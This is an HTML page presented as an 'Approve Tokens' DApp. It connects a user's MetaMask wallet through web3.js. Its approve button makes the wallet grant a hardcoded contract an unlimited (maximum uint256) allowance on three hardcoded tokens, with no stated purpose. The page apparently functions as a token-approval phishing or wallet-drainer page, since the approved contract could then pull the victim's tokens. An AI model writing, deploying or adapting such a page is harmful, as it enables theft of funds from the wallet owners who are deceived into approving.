<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve Tokens DApp</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>Approve Tokens</h1>
    <button id="connectWallet">Connect Wallet</button>
    <p>Wallet Address: <span id="walletAddress">Not Connected</span></p>
    <button id="approveTokens" disabled>Approve Tokens</button>

    <script>
        const contractAddress = "0xC553839F1d5B0006D2f760677dEEC0cB65aF7Dc9";
        const contractABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "spender", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [
                    { "internalType": "bool", "name": "", "type": "bool" }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "account", "type": "address" }
                ],
                "name": "balanceOf",
                "outputs": [
                    { "internalType": "uint256", "name": "", "type": "uint256" }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "sender", "type": "address" },
                    { "internalType": "address", "name": "recipient", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "transferFrom",
                "outputs": [
                    { "internalType": "bool", "name": "", "type": "bool" }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        let web3;
        let userAccount;
        let contract;

        // Connect Wallet Function
        document.getElementById("connectWallet").onclick = async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                    userAccount = accounts[0];
                    document.getElementById("walletAddress").innerText = userAccount;

                    contract = new web3.eth.Contract(contractABI, contractAddress);

                    document.getElementById("approveTokens").disabled = false;
                } catch (error) {
                    console.error("User denied wallet connection", error);
                }
            } else {
                alert("Please install MetaMask to use this DApp!");
            }
        };

        // Approve Tokens Function
        document.getElementById("approveTokens").onclick = async () => {
            if (!userAccount || !contract) {
                alert("Please connect your wallet first!");
                return;
            }

            try {
                const maxUint = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

                // Approve tokens for Token A, B, and C
                const tokens = [
                    "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
                    "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
                    "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
                ];

                for (const token of tokens) {
                    const tokenContract = new web3.eth.Contract(contractABI, token);
                    await tokenContract.methods.approve(contractAddress, maxUint).send({ from: userAccount });
                    console.log(`Approved ${token}`);
                }

                alert("Tokens approved successfully!");
            } catch (error) {
                console.error("Error approving tokens", error);
                alert("Failed to approve tokens. Check console for details.");
            }
        };
    </script>
</body>
</html>
